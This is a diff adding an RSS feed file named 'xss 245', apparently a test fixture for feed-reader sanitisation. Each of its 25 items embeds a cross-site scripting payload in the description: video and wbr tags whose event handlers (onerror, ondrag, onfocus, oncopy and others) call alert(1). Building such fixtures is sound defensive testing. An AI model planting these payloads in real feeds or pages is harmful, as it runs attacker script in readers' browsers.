@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>xss 245</title>
+  <link>https://www.YHTSWHBJNBCNCHWBCTPC.com</link>
+  <description>RNVDXKPQDSTUBPRQBCOA</description>
+  <item>
+    <title>UMBUDGTHZZJCCSUAQMBN</title>
+    <link>http://wwww.JLRCDIFLGGQWPRDVRDTDDYYAUBQPHEDMUZEOSQGP.com</link>
+    <description>
+      <video onmouseup="alert(1)">test</video>
+    </description>
+  </item>
+  <item>
+    <title>SMFQRMMYMCNYDXVQUFLF</title>
+    <link>http://wwww.TQOSCPGRFGTTYWIBKOZXPJBVZJEYGIKWUTUNVNFV.com</link>
+    <description>
+      <video onpaste="alert(1)" contenteditable>test</video>
+    </description>
+  </item>
+  <item>
+    <title>ZICLDDGEWEZQREFVGVLW</title>
+    <link>http://wwww.DILVSWZKKLNEXEQPMFGFFMBASRQPXOVEODHDUCLY.com</link>
+    <description>
+      <video src/onerror=alert(1)>
+    </description>
+  </item>
+  <item>
+    <title>ODAJJGQKQXKYOFOKNBEB</title>
+    <link>http://wwww.WWZIDFUPXNRODAZERBGHSTMANNHRGRYTOGPZSOFP.com</link>
+    <description>
+      <video><source onerror=alert(1) src=1></video>
+    </description>
+  </item>
+  <item>
+    <title>DICGNRSOVUEHLPJRZWQU</title>
+    <link>http://wwww.KRSWGRCURMZMUEGJWAXBEGLVOIIMXZMTXQYEBDIC.com</link>
+    <description>
+      <video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
+    </description>
+  </item>
+  <item>
+    <title>HKHQLGJUUNWOBZEASFQL</title>
+    <link>http://wwww.XIXUUQSLFBRWCIGTHSYQEIZPUMQSSXWEAEQMOQPS.com</link>
+    <description>
+      <wbr draggable="true" ondrag="alert(1)">test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>MWRFUWZMEPEIUDIKVUGP</title>
+    <link>http://wwww.FYBRZQCUDSRYJTMOCSIMDYYOXSTOSKLNFOJKYHNX.com</link>
+    <description>
+      <wbr draggable="true" ondragend="alert(1)">test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>LVJDQXJPITCQPDRKHBZU</title>
+    <link>http://wwww.JPBYUICIWNQIUXUPXZFJXBHLAEQVYCAMZIMPXETJ.com</link>
+    <description>
+      <wbr draggable="true" ondragenter="alert(1)">test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>JUDSMAGZEPFVAJYEPFVQ</title>
+    <link>http://wwww.WLDAHANRCQXOENTEAFULGSSZXQAZGYHMMDRFUDMR.com</link>
+    <description>
+      <wbr draggable="true" ondragleave="alert(1)">test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>KAETLLEKZYZMKURFILTQ</title>
+    <link>http://wwww.DOJYALZUBKMCXVBEOJIKXTIAPZOINZUHNTITHIEX.com</link>
+    <description>
+      <wbr draggable="true" ondragstart="alert(1)">test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>RNSUDGJANIVELPFSKBUS</title>
+    <link>http://wwww.MGPFRGBYEKAYVNTUDXUPAZLHEYUVTFOOMEKHOFYT.com</link>
+    <description>
+      <wbr   onactivate=alert(1)></wbr>
+    </description>
+  </item>
+  <item>
+    <title>LZYNRQOVIMVVAGWRUKOD</title>
+    <link>http://wwww.GNSOFYFDZSEZFHZGJXDETVSJSNMZOHFGSWAHQURY.com</link>
+    <description>
+      <wbr   onbeforeactivate=alert(1)></wbr>
+    </description>
+  </item>
+  <item>
+    <title>PHPVBHIKQJMGSEJLSKYH</title>
+    <link>http://wwww.FULDENXOFGTIJHNWLOAJPMDIXJMILHRENWWYHFZT.com</link>
+    <description>
+      <wbr   onbeforedeactivate=alert(1)></wbr><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>DXXLXHFUVRCECMTHHNCJ</title>
+    <link>http://wwww.WZKSCAPDQLAEWEKPANNMBDPDRGGABTKJQEQWVLRC.com</link>
+    <description>
+      <wbr   ondeactivate=alert(1)></wbr><input id=y autofocus>
+    </description>
+  </item>
+  <item>
+    <title>DHYAKQRWYZAIDPIMEXYW</title>
+    <link>http://wwww.XAFNZNBKSAEOIWSKEKUZSZWXQBEBJASXYEYWNBNF.com</link>
+    <description>
+      <wbr   onfocus=alert(1)></wbr>
+    </description>
+  </item>
+  <item>
+    <title>CZPBCAPGNNDPXGVLESQZ</title>
+    <link>http://wwww.JCORYKGHBPXQFDEZMZVAKTPVFCFHKRIGBRUCFNKM.com</link>
+    <description>
+      <wbr   onfocusin=alert(1)></wbr>
+    </description>
+  </item>
+  <item>
+    <title>FSKWPRIXWVHZACTUZTMU</title>
+    <link>http://wwww.YAIEFZGKHOUZFOGLIBBZTFRENTWENBHIYTRPMRXI.com</link>
+    <description>
+      <wbr onbeforecopy="alert(1)" contenteditable>test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>PMQWCANVIKPJZPFSGHZJ</title>
+    <link>http://wwww.MQOGMXHHXKLTQMAWCLOQUGFSCIEYBRXSFMOBZVFX.com</link>
+    <description>
+      <wbr onbeforecut="alert(1)" contenteditable>test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>FWOZRJMQIXMLVCKTPWFF</title>
+    <link>http://wwww.LLKLIGZLKOCFWRPGIVOJTWFMIQDSGTFVOKAPUVZF.com</link>
+    <description>
+      <wbr onbeforepaste="alert(1)" contenteditable>test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>CAEJBFKTGNBTUSVCNTRB</title>
+    <link>http://wwww.OXEXZVGHBOYWJDADLFJNYWXJGZHBLXXSBXDNXJFB.com</link>
+    <description>
+      <wbr onblur=alert(1)  ></wbr><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>BBFTLQVYNQMRQNGOBVSD</title>
+    <link>http://wwww.SUJPNLBCIBBRKSTLHGEFPZHPLIXEBJQJVRLVCWGL.com</link>
+    <description>
+      <wbr onclick="alert(1)">test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>EAHYODKXLSIZERUXBGNX</title>
+    <link>http://wwww.UADTDQXTAPEKFTYCPPUKGRHXWIELRVXNTZLHZAKC.com</link>
+    <description>
+      <wbr oncontextmenu="alert(1)">test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>JCRAFMMEZDKVQPRWLIWV</title>
+    <link>http://wwww.OEDFRBTCLFRFAVQCPXOXRAUHMTVMYECFSQIAAPTU.com</link>
+    <description>
+      <wbr oncopy="alert(1)" contenteditable>test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>HLMZZXVGBTZBQSHWNNMT</title>
+    <link>http://wwww.VISOOGQRNDQKJKZZDHOUSSGDOAUYFJHIROTDYSKD.com</link>
+    <description>
+      <wbr oncut="alert(1)" contenteditable>test</wbr>
+    </description>
+  </item>
+  <item>
+    <title>TOYEZLLVYETGGDFYXGPZ</title>
+    <link>http://wwww.EGNRPNORWQINTAVEMNZVRWFIOQAXJPGNYEBTGMEA.com</link>
+    <description>
+      <wbr ondblclick="alert(1)">test</wbr>
+    </description>
+  </item>
+</channel>
+</rss>
